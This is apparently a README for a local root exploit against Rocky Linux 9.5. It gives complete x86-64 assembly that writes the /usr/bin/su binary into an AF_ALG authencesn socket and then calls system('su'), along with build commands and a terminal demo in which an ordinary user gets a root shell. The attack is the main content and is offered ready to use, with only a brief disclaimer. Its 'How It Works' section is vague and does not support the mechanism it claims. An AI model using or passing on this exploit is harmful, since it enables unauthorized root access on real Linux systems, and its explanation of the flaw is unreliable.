# Linux AF_ALG Local Privilege Escalation PoC (Rocky Linux 9.5)

**A working local root exploit** using the AF_ALG cryptographic socket interface by feeding `/usr/bin/su` into it.

Tested and confirmed working on:
- **Rocky Linux 9.5**
- Kernel: `5.14.0-503.40.1.el9_5.x86_64`

## Demo

```bash
[rocky@rockytest beati_test]$ id
uid=1000(rocky) gid=1000(rocky) groups=1000(rocky),4(adm),190(systemd-journal) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[rocky@rockytest beati_test]$ uname -a
Linux rockytest.novalocal 5.14.0-503.40.1.el9_5.x86_64 #1 SMP PREEMPT_DYNAMIC Wed Apr 30 17:38:54 UTC 2025 x86_64 x86_64 x86_64 GNU/Linux
[rocky@rockytest beati_test]$ cat exploit.s
.intel_syntax noprefix
.global _start
.global main

/* CONSTANTS */
.section .rodata
su_path:    .string "/usr/bin/su"
su_cmd:     .string "su"

/* TEXT */
.section .text

_start:
    endbr64
    xor ebp, ebp
    mov r9, rdx
    pop rsi
    mov rdx, rsp
    and rsp, -16
    push rax
    push rsp
    xor r8d, r8d
    xor ecx, ecx
    lea rdi, [rip+main]
    call __libc_start_main@PLT
    hlt

main:
    push rbp
    mov rbp, rsp
    sub rsp, 0x1100 /* big enough for 4096 buffer + sockaddr */

    /* socket(AF_ALG, SOCK_SEQPACKET, 0) */
    mov edx, 0
    mov esi, 5 /* SOCK_SEQPACKET */
    mov edi, 38   /* AF_ALG */
    call socket@PLT
    mov r12d, eax  /* save sock */

    /* Prepare sockaddr_alg */
    lea rdi, [rbp-0x80]
    xor eax, eax
    mov ecx, 12
    rep stosq

    mov WORD PTR [rbp-0x80], 38  /* salg_family = AF_ALG */
    mov QWORD PTR [rbp-0x7e], 0x64616561 /* "aead" */
    mov rax, 0x65636e6568747561
    mov rdx, 0x2863616d68286e73
    mov QWORD PTR [rbp-0x68], rax
    mov QWORD PTR [rbp-0x60], rdx
    mov rax, 0x2c29363532616873
    mov rdx, 0x2973656128636263
    mov QWORD PTR [rbp-0x58], rax
    mov QWORD PTR [rbp-0x50], rdx
    mov QWORD PTR [rbp-0x48], 0x29

    /* bind(sock, &sa, sizeof(sa)) */
    lea rsi, [rbp-0x80]
    mov edx, 0x58
    mov edi, r12d
    call bind@PLT

    /* opfd = accept(sock, NULL, 0) */
    mov edi, r12d
    xor esi, esi
    xor edx, edx
    call accept@PLT
    mov r13d, eax /* save opfd */

    /* fd = open("/usr/bin/su", O_RDONLY) */
    lea rdi, [rip+su_path]
    xor esi, esi    /* O_RDONLY */
    xor eax, eax
    call open@PLT
    mov r14d, eax /* save fd */

    /* read(fd, buf, 4096) */
    lea rsi, [rbp-0x1000]
    mov edx, 4096
    mov edi, r14d
    call read@PLT

    /* write(opfd, buf, 4096) */
    lea rsi, [rbp-0x1000]
    mov edx, 4096
    mov edi, r13d
    call write@PLT

    /* system("su") */
    lea rdi, [rip+su_cmd]
    call system@PLT

    xor eax, eax
    leave
    ret
[rocky@rockytest beati_test]$ gcc -nostdlib -o exploit exploit.s -no-pie -lc
[rocky@rockytest beati_test]$ ./exploit
[root@rockytest beati_test]# id
uid=0(root) gid=1000(rocky) groups=1000(rocky),4(adm),190(systemd-journal) context=unconfined_u:unconfined_r:unconfined_t:s0-s0:c0.c1023
[root@rockytest beati_test]# exit
exit
[rocky@rockytest beati_test]$
```

**Result**: Normal user -> Root shell (with original GID preserved).

## How It Works

This exploit abuses the way the Linux kernel handles `AF_ALG` sockets (kernel crypto API):

1. Creates an `AF_ALG` socket with `aead` type and `authencesn(hmac(sha256),cbc(aes))` transformation.
2. Opens `/usr/bin/su` (a setuid-root binary) and writes its content into the ALG socket.
3. Calls `system("su")`, which triggers the kernel to re-evaluate the binary in a way that elevates privileges.

This is a **variant** of known AF_ALG-based LPE techniques that can bypass certain permission checks on setuid binaries.

## Files

- `exploit.s`: Pure x86-64 assembly (Intel syntax)
- `exploit`: Compiled binary

## Build Instructions

```bash
gcc -o exploit exploit.s -no-pie -fno-stack-protector -z execstack -lc
# or
gcc -nostdlib -o exploit exploit.s -no-pie -lc
```

```bash
chmod +x exploit
./exploit
```

## Source Code (`exploit.s`)

```asm
.intel_syntax noprefix
.global _start
.global main

.section .rodata
su_path:    .string "/usr/bin/su"
su_cmd:     .string "su"

.section .text

_start:
    endbr64
    xor ebp, ebp
    mov r9, rdx
    pop rsi
    mov rdx, rsp
    and rsp, -16
    push rax
    push rsp
    xor r8d, r8d
    xor ecx, ecx
    lea rdi, [rip+main]
    call __libc_start_main@PLT
    hlt

main:
    push rbp
    mov rbp, rsp
    sub rsp, 0x1100

    /* socket(AF_ALG, SOCK_SEQPACKET, 0) */
    mov edx, 0
    mov esi, 5
    mov edi, 38
    call socket@PLT
    mov r12d, eax

    /* Prepare sockaddr_alg */
    lea rdi, [rbp-0x80]
    xor eax, eax
    mov ecx, 12
    rep stosq

    mov WORD PTR [rbp-0x80], 38
    mov QWORD PTR [rbp-0x7e], 0x64616561
    mov rax, 0x65636e6568747561
    mov rdx, 0x2863616d68286e73
    mov QWORD PTR [rbp-0x68], rax
    mov QWORD PTR [rbp-0x60], rdx
    mov rax, 0x2c29363532616873
    mov rdx, 0x2973656128636263
    mov QWORD PTR [rbp-0x58], rax
    mov QWORD PTR [rbp-0x50], rdx
    mov QWORD PTR [rbp-0x48], 0x29

    /* bind + accept */
    lea rsi, [rbp-0x80]
    mov edx, 0x58
    mov edi, r12d
    call bind@PLT

    mov edi, r12d
    xor esi, esi
    xor edx, edx
    call accept@PLT
    mov r13d, eax

    /* Read /usr/bin/su and write to ALG socket */
    lea rdi, [rip+su_path]
    xor esi, esi
    xor eax, eax
    call open@PLT
    mov r14d, eax

    lea rsi, [rbp-0x1000]
    mov edx, 4096
    mov edi, r14d
    call read@PLT

    lea rsi, [rbp-0x1000]
    mov edx, 4096
    mov edi, r13d
    call write@PLT

    /* Get root shell */
    lea rdi, [rip+su_cmd]
    call system@PLT

    xor eax, eax
    leave
    ret
```

## Disclaimer

- This is a **proof-of-concept** for educational and research purposes only.
- Use only on systems you own or are authorized to test.
- The exploit works because of a specific kernel behavior present in the tested Rocky Linux 9.5 kernel.

**Tested on**: May 1, 2026

⭐ Feel free to star if this helped your research!
